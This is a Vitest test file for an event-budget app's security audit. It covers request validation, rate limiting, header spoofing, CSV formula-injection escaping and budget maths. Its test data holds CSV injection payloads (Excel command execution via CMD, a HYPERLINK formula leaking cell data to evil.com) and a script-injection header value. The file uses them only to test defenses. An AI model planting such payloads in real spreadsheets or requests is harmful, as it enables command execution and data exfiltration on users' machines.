import { beforeEach, describe, expect, it } from 'vitest';
import { NextRequest } from 'next/server';
import {
  applyBudgetOptimization,
  calculateBudgetSummary,
  generateBudgetOptimization,
} from '@/domain/budget';
import { exportExpensesToCsv } from '@/domain/persistence';
import { applyScenarioAdjustments, simulateScenario } from '@/domain/scenarios';
import { EventDetailsSchema } from '@/domain/schemas';
import { EventDetails, ExpenseItem } from '@/domain/types';
import { _resetRateLimitsForTesting } from '@/domain/validation/rateLimiter';
import { validateAIRequest } from '@/domain/validation/requestValidator';

describe('Adversarial Security & Robustness Audit', () => {
  beforeEach(() => {
    _resetRateLimitsForTesting();
  });

  const baseEvent: EventDetails = {
    id: 'ev-sec-1',
    title: 'Adversarial Security Gala',
    type: 'corporate',
    theme: 'Cyber Luminescence',
    targetDate: '2027-02-15',
    guestCount: 200,
    currency: 'USD',
    totalBudgetMinor: 2000000, // $20,000.00
    contingencyPercentage: 10,  // $2,000.00
    createdAt: '2026-10-01T00:00:00.000Z',
    updatedAt: '2026-10-01T00:00:00.000Z',
  };

  const initialExpenses: ExpenseItem[] = [
    {
      id: 'exp-venue-1',
      categoryId: 'venue',
      name: 'Exhibition Hall',
      estimatedCostMinor: 800000,
      actualCostMinor: 800000,
      paidMinor: 400000,
      status: 'confirmed',
      priority: 'must_have',
    },
    {
      id: 'exp-cat-1',
      categoryId: 'catering',
      name: 'Chef Tasting Menu',
      estimatedCostMinor: 600000,
      actualCostMinor: null,
      paidMinor: 0,
      status: 'planned',
      priority: 'must_have',
    },
    {
      id: 'exp-opt-1',
      categoryId: 'decor',
      name: 'Custom Hologram Display',
      estimatedCostMinor: 300000,
      actualCostMinor: null,
      paidMinor: 0,
      status: 'planned',
      priority: 'optional',
    },
  ];

  describe('1. API Route Security Validation & Malformed Payload Handling', () => {
    it('rejects unexpected Content-Type with HTTP 415 Unsupported Media Type', async () => {
      const req = new NextRequest('http://localhost:3000/api/ai/plan', {
        method: 'POST',
        headers: {
          'Content-Type': 'text/plain',
        },
        body: 'invalid plain text payload',
      });

      const { data, errorResponse } = await validateAIRequest(req, EventDetailsSchema);
      expect(data).toBeUndefined();
      expect(errorResponse).toBeDefined();
      expect(errorResponse?.status).toBe(415);

      const json = await errorResponse?.json();
      expect(json.error).toContain('Unsupported Media Type');
    });

    it('rejects oversized request bodies with HTTP 413 Payload Too Large', async () => {
      const req = new NextRequest('http://localhost:3000/api/ai/plan', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': '300000', // > 256 KB limit
        },
        body: JSON.stringify({ title: 'Oversized' }),
      });

      const { data, errorResponse } = await validateAIRequest(req, EventDetailsSchema, {
        maxBytes: 256 * 1024,
      });
      expect(data).toBeUndefined();
      expect(errorResponse).toBeDefined();
      expect(errorResponse?.status).toBe(413);

      const json = await errorResponse?.json();
      expect(json.error).toContain('Payload Too Large');
    });

    it('rejects malformed JSON syntax with HTTP 400 Bad Request', async () => {
      const req = new NextRequest('http://localhost:3000/api/ai/plan', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: '{ "invalidJson": true, ', // Syntax error
      });

      const { data, errorResponse } = await validateAIRequest(req, EventDetailsSchema);
      expect(data).toBeUndefined();
      expect(errorResponse).toBeDefined();
      expect(errorResponse?.status).toBe(400);

      const json = await errorResponse?.json();
      expect(json.error).toBe('Malformed JSON payload in request body');
    });

    it('enforces rate limiting returning HTTP 429 with Retry-After header', async () => {
      const createReq = () =>
        new NextRequest('http://localhost:3000/api/ai/plan', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-forwarded-for': '198.51.100.42',
          },
          body: JSON.stringify(baseEvent),
        });

      // Capacity = 2
      const res1 = await validateAIRequest(createReq(), EventDetailsSchema, { rateLimitCapacity: 2 });
      expect(res1.errorResponse).toBeUndefined();

      const res2 = await validateAIRequest(createReq(), EventDetailsSchema, { rateLimitCapacity: 2 });
      expect(res2.errorResponse).toBeUndefined();

      // 3rd call must exceed rate limit
      const res3 = await validateAIRequest(createReq(), EventDetailsSchema, { rateLimitCapacity: 2 });
      expect(res3.errorResponse).toBeDefined();
      expect(res3.errorResponse?.status).toBe(429);
      expect(res3.errorResponse?.headers.get('Retry-After')).toBeDefined();
    });

    it('rejects oversized body even when Content-Length header is absent (stream size capping)', async () => {
      const largePayload = JSON.stringify({
        ...baseEvent,
        theme: 'X'.repeat(300 * 1024), // ~300 KB payload
      });
      const req = new NextRequest('http://localhost:3000/api/ai/plan', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          // No Content-Length header
        },
        body: largePayload,
      });

      const { data, errorResponse } = await validateAIRequest(req, EventDetailsSchema, {
        maxBytes: 256 * 1024,
      });
      expect(data).toBeUndefined();
      expect(errorResponse).toBeDefined();
      expect(errorResponse?.status).toBe(413);
      const json = await errorResponse?.json();
      expect(json.error).toContain('Payload Too Large');
    });

    it('rejects oversized body when Content-Length header is understated', async () => {
      const largePayload = JSON.stringify({
        ...baseEvent,
        theme: 'Y'.repeat(300 * 1024),
      });
      const req = new NextRequest('http://localhost:3000/api/ai/plan', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': '42', // Deliberately understated
        },
        body: largePayload,
      });

      const { data, errorResponse } = await validateAIRequest(req, EventDetailsSchema, {
        maxBytes: 256 * 1024,
      });
      expect(data).toBeUndefined();
      expect(errorResponse).toBeDefined();
      expect(errorResponse?.status).toBe(413);
    });

    it('rejects invalid or malformed Content-Length header with HTTP 400 Bad Request', async () => {
      const req = new NextRequest('http://localhost:3000/api/ai/plan', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': '-100', // Negative / malformed
        },
        body: JSON.stringify(baseEvent),
      });

      const { data, errorResponse } = await validateAIRequest(req, EventDetailsSchema);
      expect(data).toBeUndefined();
      expect(errorResponse).toBeDefined();
      expect(errorResponse?.status).toBe(400);
      const json = await errorResponse?.json();
      expect(json.error).toContain('Invalid Content-Length header');
    });

    it('prevents rate limit bypass via spoofed x-forwarded-for header injection', async () => {
      const makeReq = (xff: string) =>
        new NextRequest('http://localhost:3000/api/ai/plan', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-forwarded-for': xff,
          },
          body: JSON.stringify(baseEvent),
        });

      // Attacker tries to inject invalid IP / header smuggling tokens:
      // resolveClientIp discards the invalid header and falls back safely
      const maliciousReq = makeReq('evil.com, <script>alert(1)</script>, 198.51.100.10');
      const res1 = await validateAIRequest(maliciousReq, EventDetailsSchema, { rateLimitCapacity: 1 });
      expect(res1.errorResponse).toBeUndefined();

      // Second request from same attacker trying another malformed token
      // Because both fall back to the same trusted socket IP/fallback, second request hits rate limit
      const maliciousReq2 = makeReq('invalid-token, 198.51.100.11');
      const res2 = await validateAIRequest(maliciousReq2, EventDetailsSchema, { rateLimitCapacity: 1 });
      expect(res2.errorResponse?.status).toBe(429);
    });

    it('uses rightmost trusted proxy hop when multiple forwarded IPs are present', async () => {
      // Upstream proxy appends client IP: "spoofed-client-ip, real-client-ip"
      // With trustedHops = 1, rightmost IP is selected for rate limiting
      const makeMultiHopReq = (spoofedPrefix: string) =>
        new NextRequest('http://localhost:3000/api/ai/plan', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-forwarded-for': `${spoofedPrefix}, 203.0.113.50`,
          },
          body: JSON.stringify(baseEvent),
        });

      // Request 1 with spoofed prefix A
      const res1 = await validateAIRequest(makeMultiHopReq('10.0.0.1'), EventDetailsSchema, {
        rateLimitCapacity: 1,
        trustedHops: 1,
      });
      expect(res1.errorResponse).toBeUndefined();

      // Request 2 with different spoofed prefix B but SAME upstream proxy IP (203.0.113.50)
      // Must be rate limited because the rightmost verified IP was used!
      const res2 = await validateAIRequest(makeMultiHopReq('10.0.0.2'), EventDetailsSchema, {
        rateLimitCapacity: 1,
        trustedHops: 1,
      });
      expect(res2.errorResponse).toBeDefined();
      expect(res2.errorResponse?.status).toBe(429);
    });

    it('ignores client-supplied x-forwarded-for header when trustProxy is disabled', async () => {
      const makeReq = (ip: string) =>
        new NextRequest('http://localhost:3000/api/ai/plan', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-forwarded-for': ip,
          },
          body: JSON.stringify(baseEvent),
        });

      // With trustProxy: false, headers are untrusted and fall back to local IP
      const res1 = await validateAIRequest(makeReq('198.51.100.1'), EventDetailsSchema, {
        rateLimitCapacity: 1,
        trustProxy: false,
      });
      expect(res1.errorResponse).toBeUndefined();

      // Attacker changes x-forwarded-for to 198.51.100.2, but trustProxy is false
      const res2 = await validateAIRequest(makeReq('198.51.100.2'), EventDetailsSchema, {
        rateLimitCapacity: 1,
        trustProxy: false,
      });
      expect(res2.errorResponse?.status).toBe(429);
    });
  });

  describe('2. CSV Formula Injection Defense (OWASP CWE-1236)', () => {
    it('neutralizes formula injection characters (=, +, -, @, tab, carriage return) in exported CSV', () => {
      const maliciousExpenses: ExpenseItem[] = [
        {
          id: 'exp-mal-1',
          categoryId: 'venue',
          name: '=CMD|\' /C calc\'!A0', // Excel command execution payload
          estimatedCostMinor: 100000,
          actualCostMinor: null,
          paidMinor: 0,
          status: 'planned',
          priority: 'must_have',
          notes: '+SUM(1+1)*cmd|\' /C notepad\'!A0',
        },
        {
          id: 'exp-mal-2',
          categoryId: 'catering',
          name: '@HYPERLINK("http://evil.com/leak?data="&A1, "Click for discount")',
          estimatedCostMinor: 200000,
          actualCostMinor: null,
          paidMinor: 0,
          status: 'planned',
          priority: 'optional',
          notes: '-2+3+cmd',
        },
      ];

      const csv = exportExpensesToCsv(maliciousExpenses);

      // Verify dangerous formula triggers are safely escaped by prepending single quote
      expect(csv).toContain("\"'=CMD|' /C calc'!A0\"");
      expect(csv).toContain("\"'+SUM(1+1)*cmd|' /C notepad'!A0\"");
      expect(csv).toContain("\"'@HYPERLINK(\"\"http://evil.com/leak?data=\"\"&A1, \"\"Click for discount\"\")\"");
      expect(csv).toContain("\"'-2+3+cmd\"");
    });
  });

  describe('3. Concurrent State Preservation & Anti-Clobbering', () => {
    it('preserves unrelated concurrent items when applying scenario adjustments', () => {
      const impact = simulateScenario(baseEvent, initialExpenses, 'rain_contingency');

      // User concurrently added an expense in another tab while review was pending
      const concurrentExpense: ExpenseItem = {
        id: 'exp-concurrent-new',
        categoryId: 'entertainment',
        name: 'Classical String Quartet',
        estimatedCostMinor: 250000,
        actualCostMinor: null,
        paidMinor: 0,
        status: 'planned',
        priority: 'nice_to_have',
      };

      const liveExpensesWithConcurrent = [...initialExpenses, concurrentExpense];
      const merged = applyScenarioAdjustments(liveExpensesWithConcurrent, impact);

      // Verify concurrent expense was NOT dropped
      const foundConcurrent = merged.find((e) => e.id === 'exp-concurrent-new');
      expect(foundConcurrent).toBeDefined();
      expect(foundConcurrent?.name).toBe('Classical String Quartet');

      // Verify scenario contingency item was also added
      const foundContingency = merged.find((e) => e.isContingency);
      expect(foundContingency).toBeDefined();
    });

    it('preserves unrelated concurrent items when applying budget optimization proposal', () => {
      const proposal = generateBudgetOptimization(baseEvent, initialExpenses);

      // User concurrently added an expense while optimization modal was open
      const concurrentExpense: ExpenseItem = {
        id: 'exp-concurrent-photog',
        categoryId: 'photography',
        name: 'Drone Videography Package',
        estimatedCostMinor: 180000,
        actualCostMinor: null,
        paidMinor: 0,
        status: 'planned',
        priority: 'nice_to_have',
      };

      const liveExpensesWithConcurrent = [...initialExpenses, concurrentExpense];
      const merged = applyBudgetOptimization(liveExpensesWithConcurrent, proposal);

      // Verify concurrent expense was NOT clobbered or removed
      const foundConcurrent = merged.find((e) => e.id === 'exp-concurrent-photog');
      expect(foundConcurrent).toBeDefined();
      expect(foundConcurrent?.estimatedCostMinor).toBe(180000);

      // Verify must-have items remained intact
      const venue = merged.find((e) => e.id === 'exp-venue-1');
      expect(venue?.estimatedCostMinor).toBe(800000);
    });
  });

  describe('4. Financial Variance & Contingency Reserve Exhaustion', () => {
    it('accurately computes financial variance as total budget minus total committed', () => {
      const summary = calculateBudgetSummary(baseEvent, initialExpenses);
      // Total budget = 2,000,000 cents
      // Committed = venue (800,000) + catering (600,000) + decor (300,000) = 1,700,000 cents
      // Variance = 2,000,000 - 1,700,000 = 300,000 cents surplus
      expect(summary.varianceMinor).toBe(300000);
      expect(summary.plannedMinor + summary.confirmedMinor).toBe(1700000);
    });

    it('correctly models contingency exhaustion when scenario costs exceed contingency reserve', () => {
      // Small budget with tiny contingency ($100 contingency reserve)
      const tightEvent: EventDetails = {
        ...baseEvent,
        totalBudgetMinor: 100000, // $1,000
        contingencyPercentage: 10, // $100 reserve
      };

      const tightExpenses: ExpenseItem[] = [
        {
          id: 'exp-t-1',
          categoryId: 'venue',
          name: 'Community Center',
          estimatedCostMinor: 85000, // $850
          actualCostMinor: null,
          paidMinor: 0,
          status: 'planned',
          priority: 'must_have',
        },
      ];

      // Rain scenario adds canopy + heating (~$1,750 cost delta)
      const impact = simulateScenario(tightEvent, tightExpenses, 'rain_contingency');

      expect(impact.costDeltaMinor).toBeGreaterThan(impact.summaryBefore.contingencyReserveMinor);
      // Contingency absorption is capped at the available contingency reserve
      expect(impact.contingencyImpactMinor).toBe(impact.summaryBefore.contingencyReserveMinor);
      // Plan goes over budget
      expect(impact.summaryAfter.isOverBudget).toBe(true);
      expect(impact.summaryAfter.unallocatedMinor).toBeLessThan(0);
    });
  });
});
